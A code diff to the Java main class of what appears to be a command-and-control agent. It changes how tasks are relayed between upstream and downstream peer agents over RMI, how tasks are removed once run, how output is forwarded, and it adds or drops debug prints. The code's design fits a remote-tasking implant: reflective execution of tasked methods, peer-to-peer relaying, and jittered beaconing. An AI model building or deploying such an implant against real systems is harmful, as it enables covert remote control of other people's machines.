@@ -146,21 +146,8 @@ public class Main
             config.isDownstream = 1;
         }
 
-        System.out.println(config.isDownstream);
-        Thread t = new Thread(new Runnable() {
-            public void run() {
-                P2PServer srvObj = new P2PServer();
-                try
-                {
-                    srvObj.rmiServer();
-                }
-                catch (Exception e)
-                {
-                    
-                }
-            }
-        });
-        t.start();
+        P2PServer srvObj = new P2PServer();
+        srvObj.rmiServer();
 
         keepalive();
     }
@@ -192,7 +179,6 @@ public class Main
 
                     if (!((String) ifaceP2PRaw.get(0)).equals("null"))
                     {
-                        System.out.println(ifaceP2PRaw.get(0).toString());
                         continue;
                     }
 
@@ -245,7 +231,6 @@ public class Main
                         {
                             tasks.add(taskSet.get(k));
                         }
-                        System.out.println(xmlResponse.toString());
                         break;
                     }
                     else
@@ -286,14 +271,16 @@ public class Main
         {
 
             Hashtable taskObj = (Hashtable) tasks.get(t);
-            tasks.remove(t);
+
 
             if (!taskObj.get("uuid").toString().equals(sessUUID))
             {
+                System.out.println(taskObj.toString());
                 System.out.println("nope, not my problem");
                 System.out.println(sessUUID);
                 continue;
             }
+
 
             String methodName = taskObj.get("method").toString();
             String className = taskObj.get("class").toString();
@@ -341,6 +328,7 @@ public class Main
                     args
                 );
             }
+            tasks.remove(t);
         }   
 
         TimeUnit.MILLISECONDS.sleep((nUtil.rngenerator(19,37))*1000);
@@ -366,7 +354,7 @@ public class Main
                     Document outData = (Document) output.get(d);
                     if (config.isDownstream == 1) 
                     {
-                        ifaceP2P.put(sessUUID,cookieData,nUtil.strand(12),output);
+                        ifaceP2P.put(sessUUID,cookieData,nUtil.strand(12),outData);
                     }
                     else
                     {
@@ -624,7 +612,7 @@ public class Main
     {
         //creates cookie session object and adds uuid to downstream agents
         public Hashtable auth(String uuid, String passwd, ArrayList downstream, String nonce) throws RemoteException, Exception;
-        public String put(String uuid, String cookie, String nonce, ArrayList data) throws RemoteException, Exception;
+        public String put(String uuid, String cookie, String nonce, Document data) throws RemoteException, Exception;
         //stop being a downstream agent, need to make sure tasking prioritizes checking upstream agents for a uuid before swapping to downstream
         public String disconnect(String uuid, String cookie, String nonce) throws RemoteException, Exception;
     }
@@ -656,6 +644,7 @@ public class Main
             {
 
                 ArrayList taskData = new ArrayList();
+                System.out.println(tasks);
                 for (int t=0;t<tasks.size();t++)
                 {
                     Hashtable taskTable = (Hashtable) tasks.get(t);
@@ -663,12 +652,17 @@ public class Main
                     //data on backend needs to account for downstream agents so the upstream agent can receive the tasks
                     //add downstreamtasks variable into agent config
                     // make tasking search downstreamtasks variable
-                    if (!taskTable.keySet().contains(sessUUID))
+                    if (!taskTable.get("uuid").toString().equals(sessUUID))
                     {
                         taskData.add(taskTable);
                     }
-                }
 
+                    if (taskTable.get("uuid").toString().equals(uuid))
+                    {
+                        tasks.remove(t);
+                    }
+                }
+                System.out.println(taskData);
                 String rmiCookie = mkCookie(uuid,config.passMat);
                 downstreamAgents.put(uuid,rmiCookie);
                 
@@ -689,7 +683,7 @@ public class Main
             }
         }
 
-        public String put(String uuid, String cookie, String downstreamNonce, ArrayList data) throws Exception, RemoteException
+        public String put(String uuid, String cookie, String downstreamNonce, Document data) throws Exception, RemoteException
         {
             security secInst = new security();
             String authBlob = new String(
@@ -702,12 +696,12 @@ public class Main
                     downstreamNonce.getBytes()
                 )
             );
-            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
+
+            System.out.println("putting");
+            System.out.println(downstreamAgents.containsKey(uuid));
+            if (downstreamAgents.containsKey(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
             {
-                for (int d=0; d<data.size(); d++)
-                {
-                    output.add(data.get(d));
-                }
+                output.add(data);
                 return "ok";
             }
             else
@@ -728,7 +722,7 @@ public class Main
                         downstreamNonce.getBytes()
                 )
             );
-            if (downstreamAgents.keySet().contains(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
+            if (downstreamAgents.containsKey(uuid) && downstreamAgents.get(uuid).toString().equals(authBlob))
             {
                 downstreamAgents.remove(uuid);
                 return "ok";
@@ -915,7 +909,6 @@ public class Main
                     )
                 );
 
-                System.out.println(postBlob);
 
                 connOutWriter.write(
                     postBlob
